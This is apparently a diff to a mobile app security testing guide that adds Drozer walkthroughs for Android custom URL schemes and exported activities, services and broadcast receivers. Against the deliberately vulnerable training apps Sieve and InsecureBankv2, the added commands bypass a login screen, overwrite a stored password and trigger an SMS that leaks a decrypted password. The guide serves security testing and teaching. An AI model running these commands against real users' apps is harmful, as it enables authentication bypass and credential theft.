@@ -190,7 +190,7 @@ Only permissions that are needed within the app should be requested in the Andro
 
 Both Android and iOS allow inter-app communication through the use of custom URL schemes. These custom URLs allow other applications to perform specific actions within the application hosting the custom URL scheme. Much like a standard web URL that might start with `https://`, custom URIs can begin with any scheme prefix and usually define an action to take within the application and parameters for that action.
 
-As a contrived example, consider: `sms://compose/to=your.boss@company.com&messsage=I%20QUIT!&sendImmediately=true`. Using something like this embedded as a link on a web page, when clicked by a victim on their mobile device, calling the custom URI with maliciously crafted parameters might trigger an SMS to be sent by the vulnerable SMS application with attacker defined content.
+As a contrived example, consider: `sms://compose/to=your.boss@company.com&message=I%20QUIT!&sendImmediately=true`. Using something like this embedded as a link on a web page, when clicked by a victim on their mobile device, calling the custom URI with maliciously crafted parameters might trigger an SMS to be sent by the vulnerable SMS application with attacker defined content.
 
 For any application, each of these custom URL schemes needs to be enumerated, and the actions they perform need to be tested.
 
@@ -204,7 +204,23 @@ Inside of an intent-filter a custom URL scheme can be defined<sup>[1]</sup>.
 
 #### Dynamic Analysis
 
-Open the app in scope for testing and log into the app, if needed. Afterwards start the browser and go to myapp://
+To enumerate URL schemes within an application that can be called by a web browser, the module `scanner.activity.browsable` should be used:
+
+```
+dz> run scanner.activity.browsable -a com.google.android.apps.messaging
+Package: com.google.android.apps.messaging
+  Invocable URIs:
+    sms://
+    mms://
+  Classes:
+    com.google.android.apps.messaging.ui.conversation.LaunchConversationActivity
+```
+
+Custom URL schemes can be called using the Drozer module `app.activity.start`:
+
+```
+dz> run app.activity.start  --action android.intent.action.VIEW --data-uri "sms://0123456789"
+```
 
 -- TODO [Describe how to test for this issue by running and interacting with the app. This can include everything from simply monitoring network traffic or aspects of the app’s behavior to code injection, debugging, instrumentation, etc.] --
 
@@ -227,7 +243,7 @@ Open the app in scope for testing and log into the app, if needed. Afterwards st
 - [1] Custom URL scheme - https://developer.android.com/guide/components/intents-filters.html#DataTest
 
 ##### Tools
--- TODO [Add link to tools for "Testing Custom URL Schemes"] --
+* Drozer - https://github.com/mwrlabs/drozer
 
 
 
@@ -247,7 +263,167 @@ Open the app in scope for testing and log into the app, if needed. Afterwards st
 
 #### Dynamic Analysis
 
--- TODO [Describe how to test for this issue by running and interacting with the app. This can include everything from simply monitoring network traffic or aspects of the app’s behavior to code injection, debugging, instrumentation, etc.] --
+IPC components can be enumerated using Drozer. To list all exported IPC components, the module `app.package.attacksurface` should be used:
+
+```
+dz> run app.package.attacksurface com.mwr.example.sieve
+Attack Surface:
+  3 activities exported
+  0 broadcast receivers exported
+  2 content providers exported
+  2 services exported
+    is debuggable
+```
+
+##### Activities
+
+To list activities exported by an application the module `app.activity.info` should be used. Specify the target package with `-a` or leave blank to target all apps on the device:
+
+```
+dz> run app.activity.info -a com.mwr.example.sieve
+Package: com.mwr.example.sieve
+  com.mwr.example.sieve.FileSelectActivity
+    Permission: null
+  com.mwr.example.sieve.MainLoginActivity
+    Permission: null
+  com.mwr.example.sieve.PWList
+    Permission: null  
+```
+
+By enumerating activities in the vulnerable password manager "Sieve"<sup>[1]</sup>, the activity `com.mwr.example.sieve.PWList` is found to be exported with no required permissions. It is possible to use the module `app.activity.start` to launch this activity.
+
+```
+dz> run app.activity.start --component com.mwr.example.sieve com.mwr.example.sieve.PWList
+```
+
+Since the activity was called directly, the login form protecting the password manager was bypassed, and the data contained within the password manager could be accessed.
+
+##### Services
+
+Services can be enumerated using the Drozer module `app.service.info`:
+
+```
+dz> run app.service.info -a com.mwr.example.sieve
+Package: com.mwr.example.sieve
+  com.mwr.example.sieve.AuthService
+    Permission: null
+  com.mwr.example.sieve.CryptoService
+    Permission: null
+```
+
+To communicate with a service, static analysis must first be used to identify the required inputs. By reversing the target application we can see the service `AuthService` provides functionality to change the password and PIN protecting the target app.
+
+```java
+   public void handleMessage(Message msg) {
+            AuthService.this.responseHandler = msg.replyTo;
+            Bundle returnBundle = msg.obj;
+            int responseCode;
+            int returnVal;
+            switch (msg.what) {
+                ...
+                case AuthService.MSG_SET /*6345*/:
+                    if (msg.arg1 == AuthService.TYPE_KEY) /*7452*/ {
+                        responseCode = 42;
+                        if (AuthService.this.setKey(returnBundle.getString("com.mwr.example.sieve.PASSWORD"))) {
+                            returnVal = 0;
+                        } else {
+                            returnVal = 1;
+                        }
+                    } else if (msg.arg1 == AuthService.TYPE_PIN) {
+                        responseCode = 41;
+                        if (AuthService.this.setPin(returnBundle.getString("com.mwr.example.sieve.PIN"))) {
+                            returnVal = 0;
+                        } else {
+                            returnVal = 1;
+                        }
+                    } else {
+                        sendUnrecognisedMessage();
+                        return;
+                    }
+```
+
+Since this service is exported, it is possible to use the module `app.service.send` to communicate with the service and change the password stored in the target application: 
+
+```
+dz> run app.service.send com.mwr.example.sieve com.mwr.example.sieve.AuthService --msg  6345 7452 1 --extra string com.mwr.example.sieve.PASSWORD "abcdabcdabcdabcd" --bundle-as-obj
+Got a reply from com.mwr.example.sieve/com.mwr.example.sieve.AuthService:
+  what: 4
+  arg1: 42
+  arg2: 0
+  Empty
+```
+
+##### Broadcasts
+
+Broadcasts can be enumerated using the Drozer module `app.broadcast.info`, the target package should be specified using the `-a` parameter:
+
+```
+dz> run app.broadcast.info -a com.android.insecurebankv2
+Package: com.android.insecurebankv2
+  com.android.insecurebankv2.MyBroadCastReceiver
+    Permission: null
+```
+
+In the example app "Android Insecure Bank"<sup>2</sup>, we can see that one broadcast receiver is exported, not requiring any permissions, indicating that we can formulate an intent to trigger the broadcast receiver. When testing broadcast receivers, static analysis must also be used to understand the functionality of the broadcast receiver.
+
+In the extract below taken from the source code of the target application, we can see that the broadcast receiver triggers a SMS message to be sent containing the decrypted password of the user.
+
+```java
+public class MyBroadCastReceiver extends BroadcastReceiver {
+  String usernameBase64ByteString;
+  public static final String MYPREFS = "mySharedPreferences";
+
+  @Override
+  public void onReceive(Context context, Intent intent) {
+    // TODO Auto-generated method stub
+
+        String phn = intent.getStringExtra("phonenumber");
+        String newpass = intent.getStringExtra("newpass");
+
+    if (phn != null) {
+      try {
+                SharedPreferences settings = context.getSharedPreferences(MYPREFS, Context.MODE_WORLD_READABLE);
+                final String username = settings.getString("EncryptedUsername", null);
+                byte[] usernameBase64Byte = Base64.decode(username, Base64.DEFAULT);
+                usernameBase64ByteString = new String(usernameBase64Byte, "UTF-8");
+                final String password = settings.getString("superSecurePassword", null);
+                CryptoClass crypt = new CryptoClass();
+                String decryptedPassword = crypt.aesDeccryptedString(password);
+                String textPhoneno = phn.toString();
+                String textMessage = "Updated Password from: "+decryptedPassword+" to: "+newpass;
+                SmsManager smsManager = SmsManager.getDefault();
+                System.out.println("For the changepassword - phonenumber: "+textPhoneno+" password is: "+textMessage);
+smsManager.sendTextMessage(textPhoneno, null, textMessage, null, null);
+```
+
+Using the Drozer module `app.broadcast.send`, it is possible to formulate an intent to trigger the broadcast and send the password to a phone number within our control:
+
+```
+dz>  run app.broadcast.send --action theBroadcast --extra string phonenumber 07123456789 --extra string newpass 12345
+```
+
+This generates the following SMS:
+
+```
+Updated Password from: SecretPassword@ to: 12345
+```
+
+###### Sniffing Intents
+
+If an Android application broadcasts intents without setting a required permission or specifying the destination package, the intents are susceptible to monitoring by any application on the device.
+
+To register a broadcast receiver to sniff intents, the Drozer module `app.broadcast.sniff` should be used, specifying the action to monitor with the `--action` parameter:
+
+```
+dz> run app.broadcast.sniff  --action theBroadcast
+[*] Broadcast receiver registered to sniff matching intents
+[*] Output is updated once a second. Press Control+C to exit.
+
+Action: theBroadcast
+Raw: Intent { act=theBroadcast flg=0x10 (has extras) }
+Extra: phonenumber=07123456789 (java.lang.String)
+Extra: newpass=12345 (java.lang.String)
+```
 
 #### Remediation
 
@@ -265,11 +441,11 @@ Open the app in scope for testing and log into the app, if needed. Afterwards st
 -- TODO [Add links and titles for CWE related to the "Testing For Sensitive Functionality Exposure Through IPC" topic] --
 
 ##### Info
-- [1] Meyer's Recipe for Tomato Soup - http://www.finecooking.com/recipes/meyers-classic-tomato-soup.aspx
+- [1] Sieve: Vulnerable Password Manager - https://github.com/mwrlabs/drozer/releases/download/2.3.4/sieve.apk
+- [2] Android Insecure Bank V2 - https://github.com/dineshshetty/Android-InsecureBankv2
 
 ##### Tools
--- TODO [Add links to relevant tools for the "Testing For Sensitive Functionality Exposure Through IPC" topic] --
-
+* Drozer - https://github.com/mwrlabs/drozer
 
 ### Testing JavaScript Execution in WebViews
 
